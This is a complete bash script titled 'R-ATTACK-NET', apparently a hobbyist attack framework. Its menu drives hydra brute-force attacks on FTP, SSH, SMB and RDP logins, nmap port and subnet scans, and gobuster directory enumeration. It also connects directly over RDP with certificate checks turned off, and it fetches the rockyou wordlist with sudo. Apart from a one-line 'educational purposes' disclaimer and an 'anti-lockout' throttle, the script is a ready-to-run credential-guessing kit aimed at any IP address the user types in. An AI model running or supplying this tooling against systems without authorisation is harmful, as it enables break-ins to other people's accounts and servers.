#!/bin/bash
##  ===================================================================
##  R-ATTACK-NET : ULTIMATE 3D EDITION v4.9
##  Lead Architect : RAEED KHAN (RHCSA | BBA UOB)
##  ===================================================================

# ==========================================
# SAFE EXIT TRAP (Ctrl+C Protection)
# ==========================================
trap 'echo -e "\n\033[1;32m[+] Exiting safely... Stay Invisible, Raeed.\033[0m"; tput cnorm; echo -e "\033[0m"; exit 0' INT

# ==========================================
# COLOR CODES
# ==========================================
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
NC='\033[0m'
BG_BLACK='\033[40m'
BOLD='\033[1m'

# Global Variables
TARGET_IP=""
USERNAME=""
WORDLIST=""
REPORT_DIR="reports"

# ==========================================
# LIGHTNING TYPING EFFECT
# ==========================================
type_lightning() {
    local text="$1"
    local color="$2"
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${color}${text:$i:1}${NC}"
        sleep 0.01
    done
    echo ""
}

# ==========================================
# BANNER FUNCTION WITH 3D ASCII ART
# ==========================================
show_banner() {
    clear
    # 3D ASCII ART
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠀⠀⢀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡔⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣫⣯⣷⣾⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⡙⢿⣿⣿⣿⣿⣿⣿⡿⢋⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⠿⠿⢟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⡏⠉⠙⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡿⡍⠳⣄⡀⢀⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⢿⡄⠸⡿⢄⠛⣘⢠⣼⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀${NC}"
    echo -e "${WHITE}⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡞⣼⡻⡄⠳⡤⠽⠾⠿⠿⠿⢛⣻⣿⣿⣿⣷⡀⠀⠀⠀${NC}"
    echo -e "${WHITE}⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣄⠙⢶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀${NC}"
    echo -e "${WHITE}⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⢉⣁⣀⣀⣀⣀⣀⣉⡉⠙⠛⠻⢿⣿⣿⣿⣿⣿⣯⣻⣍⡲⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀${NC}"
    echo -e "${WHITE}⠀⢀⡀⣶⣤⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣁⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣈⠛⢿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⡿⠟⠛⠛⠁⠀⠀${NC}"
    echo -e "${WHITE}⣰⣿⣿⣿⣿⣿⣿⣿⣝⢿⣿⣿⣿⣿⣿⣿⣟⣡⣶⠿⢛⣛⣉⣭⣭⣤⣤⡴⠶⠶⠶⠶⢲⣴⣤⠭⠭⡭⣟⠻⠦⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢉⣀⣠⣶⣿ↆ⠀⠀${NC}"
    echo -e "${WHITE}⠹⣿⣿⣿⣿⣿⣿⣙⠻⣿⣮⣛⠿⣿⣿⣿⣫⣵⡶⠟⣛⣋⣭⣭⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣮⣽⣿⣿⣿⠿⠟⠛⠉⢀⣴⣿⣿⣿⣿⣿⣿⣶⡀${NC}"
    echo -e "${WHITE}⠀⠈⠙⠋⠁⠀⠈⠉⠛⠳⣭⣛⢷⣦⣸⣿⣯⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⡟⣿⣿⣿⣿⡇${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⠿⠿⢿⣹⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡏⣀⣴⣾⣿⣿⠿⠛⠉⠀⠀⠀⠈⠛⠛⠉⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⢀⣴⠿⠛⠋⠁⠀⠀⠀⢀⣯⢿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⠣⣟⡻⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⣀⣴⣾⣿⠈⡿⣿⠃⠀⠀⠀⠈⠉⠛⠻⠿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠀⠈⠉⠛⣿⣽⡟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣹⡟⣻⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⢹⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⣰⣿⢣⡇⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠟⠋⠙⠛⠻⣿⣿⣿⣿⣿⠏⠀⠈⢿⣿⣿⣿⣦⣄⣀⣀⣀⣠⣴⣿⣏⡞⢻⣸⣿⣷⣄⠀⠀⣀⣤⠴⣾⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⠃⠀⠀⠀⠈⢿⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣶⠾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣏⠀⠀⠀⠀⠀⣀⣼⣿⡛⢿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠟⣡⣾⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⢠⣶⣿⣿⣯⣿⡇⠀⢹⣿⣿⣿⣿⣷⣤⣤⣦⣶⣿⣿⣿⣿⣿⡇⠀⣿⣿⢸⣿⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣠⣴⣾⣿⣟⣿⠟⠁⣿⡇⠀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡇⢀⣿⣿⠙⢮⣛⠿⣷⣦⣄⣀⣀⣀⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⣴⣶⣶⣾⣿⣿⡿⣛⣽⠞⠋⠀⠀⠀⣿⣷⠀⣍⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠉⡄⣸⣿⡿⠀⠀⠈⠙⠮⣟⠿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⢀⣹⣿⣿⣿⢵⡿⠋⠀⠀⠀⠀⠀⠀⢿⣿⣦⣿⡷⣄⠙⠿⣿⢹⣿⣿⡿⠋⣡⣶⣳⣿⣿⣿⠃⠀⠀⠀⠀⠀⠈⠿⠬⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠸⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣷⣻⢿⣶⣬⣈⣉⣉⣤⣴⣿⣻⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⡇⣿⣇⣿⢹⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
    echo -e "${CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡁⠀⠀⠀⠀⠀${NC}"
    echo ""
    echo -e "${ORANGE}  _____          ______ ______ _____  ${NC}"
    echo -e "${RED} |  __ \    /\   |  ____|  ____|  __ \ ${NC}"
    echo -e "${GREEN} | |__) |  /  \  | |__   | |__   | |  | |${NC}"
    echo -e "${YELLOW} |  _  /  / /\ \ |  __|  |  __|  | |  | |${NC}"
    echo -e "${BLUE} | | \ \ / ____ \| |____| |____| |__| |${NC}"
    echo -e "${CYAN} |_|  \_\_/__ \_\______|______|_____/  ${NC}"
    echo -e ""
    echo -e "${MAGENTA}        ╔══════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}        ║      https://github.com/Raeed-khan           ║${NC}"
    echo -e "${MAGENTA}        ╚══════════════════════════════════════════════╝${NC}"
    echo -e ""
    echo -e "${BLUE}[+] =============================================== [+]${NC}"
    echo -e "${GREEN}[+] Framework : RAEED-SYSTEMS WIRELESS AUTOMATION   [+]${NC}"
    echo -e "${GREEN}[+] Lead      : Raeed Khan (BBA student UOB)        [+]${NC}"
    echo -e "${BLUE}[+] =============================================== [+]${NC}"
    echo -e ""
}

# ==========================================
# SMART AUTO INSTALL & DIRECTORY SETUP
# ==========================================
install_dependencies() {
    type_lightning "[+] Verifying System Dependencies & Creating Reports Dir Raeed Khan..." "${CYAN}"
    
    mkdir -p "$REPORT_DIR"
    tools=("hydra" "nmap" "freerdp3-x11" "openssh-client" "smbclient" "ftp" "gobuster")
    missing=()
    
    for tool in "${tools[@]}"; do
        if ! dpkg -s "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${YELLOW}[!] Missing Dependencies: ${missing[*]}${NC}"
        sudo apt update -y &> /dev/null
        sudo apt install -y "${missing[@]}" &> /dev/null
    fi
    
    if [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
        echo -e "${YELLOW}[!] Downloading rockyou.txt...${NC}"
        sudo mkdir -p /usr/share/wordlists
        sudo wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /usr/share/wordlists/rockyou.txt &> /dev/null
    fi
    
    type_lightning "[+] System Ready! All Modules Active." "${GREEN}"
    sleep 1
}

# ==========================================
# HELPER FUNCTIONS
# ==========================================
get_target_ip() {
    read -p "$(echo -e ${CYAN}"[?] Enter Target IP: "${NC})" TARGET_IP
    if [[ ! $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo -e "${RED}[-] Invalid IP Format!${NC}"; return 1
    fi
    return 0
}

get_wordlist() {
    read -p "$(echo -e ${CYAN}"[?] Wordlist Path (Default: rockyou.txt): "${NC})" WORDLIST
    [ -z "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
}

# ==========================================
# COLORIZED HYDRA RUNNER FUNCTION
# ==========================================
run_hydra_colorized() {
    local cmd="$1"
    local report_file="$2"
    
    eval "$cmd" | while IFS= read -r line; do
        if echo "$line" | grep -qE "login:|password:"; then
            echo -e "\033[1;32m$line\033[0m"
        else
            echo "$line"
        fi
    done | tee "$report_file"
}

# ==========================================
# RDP ATTACK & SMART CONNECT MODULE
# ==========================================
rdp_attack() {
    while true; do
        clear
        echo -e "\n${MAGENTA}  ╔════════════════════════════════════════════════════╗${NC}"
        echo -e "${MAGENTA}    ║             RDP ATTACK & SMART CONNECT             ║${NC}"
        echo -e "${MAGENTA}    ╚════════════════════════════════════════════════════╝${NC}"
        echo -e "${CYAN}  [1]${NC} Known Username + Wordlist (Safe Hydra)"
        echo -e "${CYAN}  [2]${NC} Full Brute Force"
        echo -e "${CYAN}  [3]${NC} Check RDP Port (Nmap)"
        echo -e "${CYAN}  [4]${NC} ${GREEN}Smart Direct Connect (Known Credentials)${NC}"
        echo -e "${CYAN}  [5]${NC} Back to Main Menu"
        read -p "$(echo -e ${YELLOW}"  Select [1-5]: "${NC})" rdp_choice
        
        case $rdp_choice in
            1)
                get_target_ip || continue
                read -p "$(echo -e ${CYAN}"[?] Enter Username: "${NC})" USERNAME
                get_wordlist
                echo -e "\n${GREEN}[+] Running Hydra in SAFE MODE (Anti-Lockout)...${NC}"
                run_hydra_colorized "hydra -l '$USERNAME' -P '$WORDLIST' -s 3389 -t 1 -W 3 rdp://$TARGET_IP -V" "$REPORT_DIR/rdp_hydra_$(date +%F_%T).txt"
                ;;
            2)
                get_target_ip || continue
                read -p "$(echo -e ${CYAN}"[?] Enter Username List: "${NC})" USERLIST
                get_wordlist
                echo -e "\n${GREEN}[+] Running Full Brute Force...${NC}"
                run_hydra_colorized "hydra -L '$USERLIST' -P '$WORDLIST' -s 3389 -t 1 -W 3 rdp://$TARGET_IP -V" "$REPORT_DIR/rdp_full_$(date +%F_%T).txt"
                ;;
            3)
                get_target_ip || continue
                echo -e "\n${GREEN}[+] Scanning RDP Port...${NC}"
                nmap -p 3389 "$TARGET_IP" | tee "$REPORT_DIR/rdp_scan_$(date +%F_%T).txt"
                ;;
            4)
                get_target_ip || continue
                read -p "$(echo -e ${CYAN}"[?] Enter Username: "${NC})" RDP_USER
                read -p "$(echo -e ${CYAN}"[?] Enter Password: "${NC})" RDP_PASS
                
                echo -e "\n${GREEN}[+] Initializing Secure RDP Tunnel to $TARGET_IP...${NC}"
                echo -e "${YELLOW}[!] If a certificate prompt appears, select 'Yes'.${NC}"
                sleep 1
                xfreerdp /v:$TARGET_IP /u:$RDP_USER /p:$RDP_PASS /cert:ignore +clipboard /dynamic-resolution /f
                if [ $? -ne 0 ]; then
                    echo -e "\n${RED}[-] Connection Failed. Check IP, Username, or Password.${NC}"
                fi
                ;;
            5) break ;;
            *) echo -e "${RED}[-] Invalid Option!${NC}" ;;
        esac
        read -p "$(echo -e ${YELLOW}"\nPress [Enter] to continue..."${NC})"
    done
}

# ==========================================
# OTHER ATTACK MODULES
# ==========================================
ftp_attack() {
    clear; echo -e "\n${YELLOW}[+] FTP Attack Module${NC}"
    get_target_ip || return
    read -p "$(echo -e ${CYAN}"[?] Enter Username: "${NC})" USERNAME
    get_wordlist
    run_hydra_colorized "hydra -l '$USERNAME' -P '$WORDLIST' -t 2 '$TARGET_IP' ftp -V" "$REPORT_DIR/ftp_attack_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

ssh_attack() {
    clear; echo -e "\n${YELLOW}[+] SSH Attack Module${NC}"
    get_target_ip || return
    read -p "$(echo -e ${CYAN}"[?] Enter Username: "${NC})" USERNAME
    get_wordlist
    run_hydra_colorized "hydra -l '$USERNAME' -P '$WORDLIST' -t 2 '$TARGET_IP' ssh -V" "$REPORT_DIR/ssh_attack_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

smb_attack() {
    clear; echo -e "\n${YELLOW}[+] SMB Attack Module${NC}"
    get_target_ip || return
    read -p "$(echo -e ${CYAN}"[?] Enter Username: "${NC})" USERNAME
    get_wordlist
    run_hydra_colorized "hydra -l '$USERNAME' -P '$WORDLIST' -t 2 '$TARGET_IP' smb -V" "$REPORT_DIR/smb_attack_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

port_scan() {
    clear; echo -e "\n${YELLOW}[+] Deep Port Scan (Nmap)${NC}"
    get_target_ip || return
    nmap -sV -sC -p 21,22,23,80,139,443,445,3389 "$TARGET_IP" | tee "$REPORT_DIR/nmap_scan_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

# ==========================================
# ADVANCED MODULES
# ==========================================
web_dir_scan() {
    clear; echo -e "\n${YELLOW}[+] Web Directory Brute-Force (Gobuster Module)${NC}"
    read -p "$(echo -e ${CYAN}"[?] Enter Target URL (e.g., http://192.168.1.10): "${NC})" target_url
    read -p "$(echo -e ${CYAN}"[?] Enter Wordlist path for dirs (default: /usr/share/wordlists/dirb/common.txt): "${NC})" web_wordlist
    [ -z "$web_wordlist" ] && web_wordlist="/usr/share/wordlists/dirb/common.txt"
    
    if [ ! -f "$web_wordlist" ]; then
        echo -e "${YELLOW}[!] Wordlist not found. Using rockyou fallback.${NC}"
        web_wordlist="/usr/share/wordlists/rockyou.txt"
    fi

    echo -e "${GREEN}[+] Running Gobuster on $target_url...${NC}"
    gobuster dir -u "$target_url" -w "$web_wordlist" -t 30 | tee "$REPORT_DIR/gobuster_scan_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

live_host_discovery() {
    clear; echo -e "\n${YELLOW}[+] Live Host Discovery (Subnet Scan)${NC}"
    read -p "$(echo -e ${CYAN}"[?] Enter Subnet (e.g., 192.168.1.0/24): "${NC})" subnet
    [ -z "$subnet" ] && subnet="192.168.1.0/24"
    
    echo -e "${GREEN}[+] Scanning active hosts in $subnet...${NC}"
    nmap -sn "$subnet" | tee "$REPORT_DIR/live_hosts_$(date +%F_%T).txt"
    read -p "$(echo -e ${YELLOW}"Press [Enter] to continue..."${NC})"
}

network_status() {
    clear; echo -e "\n${YELLOW}[+] Network Interface & IP Configuration${NC}"
    ip -c a
    echo -e "\n${CYAN}[+] Active Routing Table:${NC}"
    ip route
    read -p "$(echo -e ${YELLOW}"\nPress [Enter] to continue..."${NC})"
}

# ==========================================
# 3D MAIN MENU
# ==========================================
show_menu() {
    show_banner
    # HEADER DISPLAY
    echo -e "${RED}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${GREEN}${BOLD}            WIRELESS SECURITY AUDIT FRAMEWORK v3.0              ${RED}║${NC}"
    echo -e "${RED}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${YELLOW}  ⚠  LEGAL DISCLAIMER : For Educational Purposes Only           ${RED}║${NC}"
    echo -e "${RED}║${RED}  ⛔  UNAUTHORIZED ACCESS IS PROHIBITED BY LAW                  ${RED}║${NC}"
    echo -e "${RED}║${CYAN}  🔐  Use Responsibly & Stay Ethical                            ${RED}║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}  ╔═══════════════════ ATTACK & AUDIT MENU ═══════════════════╗${NC}"
    echo -e "${WHITE}  ║${CYAN}  [1]${NC}  FTP Attack (Hydra)                                  ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [2]${NC}  ${BOLD}${YELLOW}RDP Attack & Smart Connect                          ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [3]${NC}  SSH Attack (Hydra)                                  ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [4]${NC}  SMB Attack (Hydra)                                  ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [5]${NC}  Deep Port Scan (Nmap)                               ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [6]${NC}  Web App Directory Scan (Gobuster)                   ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [7]${NC}  Live Host Discovery (Subnet Sc                      ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${CYAN}  [8]${NC}  Network Interface Status                            ${WHITE}║${NC}"
    echo -e "${WHITE}  ║${RED}  [9]${NC}  Exit System                                         ${WHITE}║${NC}"
    echo -e "${WHITE}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    read -p "$(echo -e ${GREEN}"\n[?] Select Option [1-9]: "${NC})" choice
}

# ==========================================
# EXECUTION ENGINE
# ==========================================
install_dependencies
while true; do
    show_menu
    case $choice in
        1) ftp_attack ;;
        2) rdp_attack ;;
        3) ssh_attack ;;
        4) smb_attack ;;
        5) port_scan ;;
        6) web_dir_scan ;;
        7) live_host_discovery ;;
        8) network_status ;;
        9) echo -e "\n${GREEN}Shutting down R-ATTACK-NET... Stay Invisible, Raeed.${NC}"; exit 0 ;;
        *) echo -e "${RED}[-] Invalid Option! Please select 1-9.${NC}" ;;
    esac
done
